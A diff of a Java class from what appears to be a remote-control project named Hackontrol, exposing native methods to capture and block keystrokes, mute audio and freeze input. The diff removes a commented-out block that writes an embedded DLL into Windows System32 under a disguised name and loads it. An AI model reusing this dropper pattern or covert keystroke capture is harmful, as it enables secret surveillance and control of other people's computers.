@@ -8,33 +8,12 @@ import java.util.Map;
 public class NativeLibrary {
 	private NativeLibrary() {}
 
-	public static final List<KeyEntry> KEYSTROKE_LIST;
-	public static final Map<Integer, Boolean> KEYSTROKE_MAP;
+	public static final List<KeyEntry> KEYSTROKE_LIST = new ArrayList<>();
+	public static final Map<Integer, Boolean> KEYSTROKE_MAP = new HashMap<>();
 
-	public static boolean Block;
-	public static boolean Enable;
-	public static boolean Freeze;
-
-	static {
-		/*try {
-			InputStream inputStream = NativeLibrary.class.getClassLoader().getResourceAsStream("Hackontrol.dll");
-			byte[] data = inputStream.readAllBytes();
-			inputStream.close();
-			File file = new File("C:\\Windows\\System32\\libnative32.dll");
-			FileOutputStream outputStream = new FileOutputStream(file);
-			outputStream.write(data);
-			outputStream.close();
-			System.load(file.getAbsolutePath());
-		} catch(Throwable Errors) {
-			Errors.printStackTrace();
-		}*/
-
-		System.load("D:\\GitHub Repository\\Hackontrol\\Hackontrol\\x64\\Debug\\Native Library.dll");
-		KEYSTROKE_LIST = new ArrayList<>();
-		KEYSTROKE_MAP = new HashMap<>();
-		NativeLibrary.Block = false;
-		NativeLibrary.Enable = false;
-	}
+	public static boolean Block = false;
+	public static boolean Enable = false;
+	public static boolean Freeze = false;
 
 	public static native String machineName();
 	public static native String sleep();
@@ -52,10 +31,6 @@ public class NativeLibrary {
 	public static native boolean mute(boolean mute);
 	public static native boolean mute();
 	public static native void freeze(boolean freeze);
-
-	public static void load() {
-		// Load the class
-	}
 
 	private static boolean log(int keyAction, int keyCode, int scanCode, int flags, int time) {
 		boolean block = NativeLibrary.Block || NativeLibrary.Freeze;
